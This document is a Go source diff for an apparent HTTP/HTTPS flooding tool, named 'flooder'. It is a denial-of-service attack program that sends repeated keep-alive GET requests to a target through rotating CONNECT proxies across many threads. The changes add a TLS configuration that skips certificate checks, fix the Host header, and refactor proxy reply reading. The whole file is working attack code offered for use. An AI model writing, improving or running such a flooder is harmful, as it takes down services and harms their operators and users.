@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"flag"
+	"flooder/Utils"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -41,13 +42,12 @@ var (
 			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
 		}, // 支持的加密套件列表
 	}
-	target              = flag.String("target", "127.0.0.1:8080", "ip:port")
-	threads             = flag.Int("threads", 1, "how many threads")
-	repeatRequest       = flag.Int("repeatRequest", 70, "abuse keep-alive connection")
-	https               = flag.Bool("https", false, "tls1")
-	proxies             = flag.String("proxies", "no proxy", "path 2 proxies file")
+	target        = flag.String("target", "127.0.0.1:8080", "ip:port")
+	threads       = flag.Int("threads", 1, "how many threads")
+	repeatRequest = flag.Int("repeatRequest", 70, "abuse keep-alive connection")
+	https         = flag.Bool("https", false, "tls1")
+	proxies       = flag.String("proxies", "no proxy", "path 2 proxies file")
 )
-
 
 func main() {
 	flag.Parse()
@@ -83,8 +83,35 @@ func main() {
 		}
 		proxyLines = strings.Split(string(proxyListBytes), "\n")
 	}
-	// defer
-	payload := []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + *target + "\r\nConnection: Keep-Alive\r\n\r\n")
+	TLSConfig = &tls.Config{
+		MinVersion: tls.VersionTLS12, // 设置最低支持版本为TLS1.2
+		CurvePreferences: []tls.CurveID{
+			tls.X25519,
+			tls.CurveP256,
+			tls.CurveP384,
+		}, // 支持的曲线类型
+		InsecureSkipVerify:       true, // 是否需要验证服务器证书
+		ServerName:               parsedTarget.Hostname(),
+		PreferServerCipherSuites: true, // 使用服务器加密套件列表中的加密算法
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
+		}, // 支持的加密套件列表
+	}
+	payload := []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + ":" + parsedTarget.Port() + "\r\nConnection: Keep-Alive\r\n\r\n")
 	for i := 0; i < *threads; i++ {
 		go flood(payload, proxyLines)
 	}
@@ -148,13 +175,12 @@ func proxied_https_flood(proxyAddr, targetAddr string, payload []byte) {
 
 		// Send CONNECT request to proxy
 		proxyConn.Write([]byte(fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", targetAddr, targetAddr)))
-		reply := make([]byte, 1024)
-		n, err := proxyConn.Read(reply)
-		if err != nil {
+		reply := Utils.ReadConn(proxyConn)
+		if reply == nil {
 			fmt.Println(err)
 			return
 		}
-		if len(string(reply[:n])) < 14 || string(reply[:n])[:14] != "HTTP/1.1 200 C" {
+		if len(string(reply)) < 14 || string(reply)[:14] != "HTTP/1.1 200 C" {
 			return
 		}
 		// Now conn is a transparent proxy connection to the target server
@@ -177,13 +203,11 @@ func proxied_http_flood(proxyAddr, targetAddr string, payload []byte) {
 
 		// Send CONNECT request to proxy
 		proxyConn.Write([]byte(fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", targetAddr, targetAddr)))
-		reply := make([]byte, 1024)
-		n, err := proxyConn.Read(reply)
-		if err != nil {
-			fmt.Println(err)
+		reply := Utils.ReadConn(proxyConn)
+		if reply == nil {
 			return
 		}
-		if len(string(reply[:n])) < 14 || string(reply[:n])[:14] != "HTTP/1.1 200 C" {
+		if len(string(reply)) < 14 || string(reply)[:14] != "HTTP/1.1 200 C" {
 			return
 		}
 		// Now conn is a transparent proxy connection to the target server
